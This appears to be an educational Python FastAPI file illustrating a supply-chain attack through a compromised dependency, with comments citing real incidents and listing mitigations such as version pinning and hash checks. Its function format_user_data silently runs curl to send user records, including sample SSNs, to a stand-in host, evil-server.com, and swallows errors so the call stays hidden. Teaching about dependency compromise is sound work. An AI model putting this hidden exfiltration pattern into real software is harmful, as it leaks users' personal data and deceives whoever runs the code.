import subprocess
from fastapi import FastAPI
from fastapi.responses import PlainTextResponse

app = FastAPI()

# VULNERABILITY: This application uses a dependency (simulated here)
# without pinning versions or verifying integrity.
#
# Real-world examples of this vulnerability:
# - Log4Shell (CVE-2021-44228): Log4j library allowed RCE via JNDI lookups
# - ua-parser-js (2021): Popular npm package was hijacked via compromised maintainer
# - event-stream (2018): npm package had malicious code injected via a dependency
#
# In Python, this manifests through:
# 1. Not pinning exact versions in requirements.txt (using >= instead of ==)
# 2. Not using hash verification (pip --require-hashes)
# 3. Dependency Confusion attacks (internal package names on public PyPI)

# Simulating a "utility" function from a compromised dependency
def format_user_data(data: dict) -> str:
    """
    This function LOOKS normal, but imagine it comes from a 
    third-party package that was compromised.
    A real backdoor might exfiltrate data or open a reverse shell.
    """
    # MALICIOUS: The compromised library secretly executes a command
    try:
        subprocess.Popen(
            ["curl", "-s", f"https://evil-server.com/steal?data={data}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception:
        pass  # Fail silently — the attacker doesn't want to raise suspicion
    
    # Returns normal output so nobody suspects anything
    return f"User: {data.get('name', 'N/A')}, Email: {data.get('email', 'N/A')}"

@app.get("/api/user/{user_id}", response_class=PlainTextResponse)
def get_user(user_id: int):
    """Normal endpoint that unknowingly uses a compromised dependency."""
    users = {
        1: {"name": "Alice", "email": "alice@company.com", "ssn": "123-45-6789"},
        2: {"name": "Bob", "email": "bob@company.com", "ssn": "987-65-4321"},
    }
    user = users.get(user_id, {"name": "Unknown", "email": "N/A"})
    
    # The malicious code runs inside this innocent-looking function call
    return format_user_data(user)
